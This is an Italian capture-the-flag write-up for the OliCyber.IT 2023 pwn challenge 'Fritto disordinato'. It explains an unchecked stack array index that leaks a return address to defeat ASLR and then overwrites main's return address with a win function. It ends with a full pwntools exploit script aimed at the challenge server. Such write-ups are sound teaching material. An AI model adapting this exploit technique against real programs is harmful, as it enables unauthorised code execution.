# OliCyber.IT 2023 - Selezione territoriale

## [binary-3] Fritto disordinato (7 risoluzioni)

La chall è una classica pwn, in cui esaminando il sorgente si vede in fretta la presenza di una win function che stampa la flag.
La funzione non è raggiungibile usando il programma in modo convenzionale, è necessario arrivarci corrompendo in qualche modo la memoria del processo.
Il binario è compilato staticamente e sono attive tutte le protezioni, ASLR, canary, NX.

Esaminando qualche dettaglio extra del sorgente, vediamo che all'interno della chall c'è un array di interi di lunghezza fissa allocato sullo stack e questo array viene utilizzato come "ordine" di una lista di stringhe, la canzone del gabibbo. Usando il programma come da specifiche, possiamo settare e leggere i valori su questo array, oppure provare a far cantare la canzone al gabibbo, che non sarà contento di cantarla out-of order.

### Soluzione

Possiamo notare che non viene fatto alcun tipo di bounds check quando andiamo a leggere o scrivere su questo array. Dato che l'array è sullo stack, abbiamo già praticamente vinto. Leggendo out of bound possiamo infatti andare a leggere un sacco di cose utili:

- indirizzi dell'eseguibile (non della libc, è linkato staticamente)
- indirizzi dello stack
- il canary
- indirizzi dell'heap

Di questi in realtà abbiamo bisogno solo dell'indirizzo dell'eseguibile, essendo linkato staticamente e avendo una win function pronta. Una volta letto un qualsiasi indirizzo dell'eseguibile dallo stack possiamo ricavarci la base dell'esegubile e quindi calcolare l'indirizzo della funzione win, essendo sempre ad un offset fisso le une rispetto alle altre. Per trovare un indirizzo dell'esegubile, possiamo ricordarci che lo stack-frame x86 è sempre

```text
canary
old_rbp
return_address
```

per cui esaminando con gdb la memoria subito prima della chiamata a `printf` in `load_num`, possiamo vedere come ci sia per esempio l'indirizzo a cui deve tornare la funzione `load_num` sullo stack, poco più in alto rispetto al vettore che controlliamo.
Ricordando che sono interi a 32bit, mentre gli indirizzi sono a 64, dovremo leggere due numeri, rispettivamente alla posizione -10, -9, che saranno la parte più e meno significativa del numero.

Ottenuto questo leak di informazioni possiamo sovrascrivere l'indirizzo a cui ritorna la funzione `main`, mettendoci l'indirizzo della funzione `win`. Dovremo anche in questo caso scrivere due numeri, che saranno ad offset 34, 35 (in realtà non dobbiamo davvero cambiare la parte più significativa dell'indirizzo perché sarà già quella giusta, ma lo facciamo comunque perché abbiamo una primitiva che permette di fare tutto e questo è un caso più generale).

### Exploit

```python
#!/usr/bin/env python3
from pwn import ELF, context, process, log, ui, args, remote
from os.path import split

exe = context.binary = ELF("fritto")
remotehost = ("fritto-disordinato.challs.olicyber.it", 34000)


def menu(io, choice: int):
    io.sendlineafter(b"> ", f"{choice}".encode())


def store(io, pos: int, val: int):
    menu(io, 0)
    io.sendlineafter(b"numero?", f"{pos}".encode())
    io.sendlineafter(b"scriverci?", f"{val}".encode())


def read(io, pos: int):
    menu(io, 1)
    io.sendlineafter(b"leggere?\n", f"{pos}".encode())
    val = int(io.recvline(False).decode().split(":")[1].strip())
    return (2**32 + val) % 2**32


def read_8_bytes(io, pos: int):
    val1 = read(io, pos)
    val2 = read(io, pos + 1)
    return val1 + (val2 << 32)


def write_8_bytes(io, pos: int, val: int):
    store(io, pos + 1, val >> 32)
    store(io, pos, val % 2**32)


def canzone():
    io = process([exe.path], cwd=split(exe.path)[0])
    for i, pos in enumerate([13, 3, 14, 1, 9, 7, 10, 15, 17, 12, 16, 6, 11, 2, 8, 0, 4, 5]):
        store(io, i, pos)
    menu(io, 2)
    io.interactive()


def main():
    if args.REMOTE:
        io = remote(*remotehost)
    else:
        io = process([exe.path], cwd=split(exe.path)[0], env={"FLAG": "flag{test}"})
        ui.pause()
    io.recvuntil(b"Canta la canzone")
    retaddr = read_8_bytes(io, -10)
    log.success(f"Leaked {retaddr = :#018x}")
    exe.address = retaddr - (exe.sym['main'] + 241)
    log.success(f"Leaked {exe.address = :#018x}")
    write_8_bytes(io, 34, exe.sym['win'])
    menu(io, 7)
    io.interactive()


if __name__ == "__main__":
    main()
```
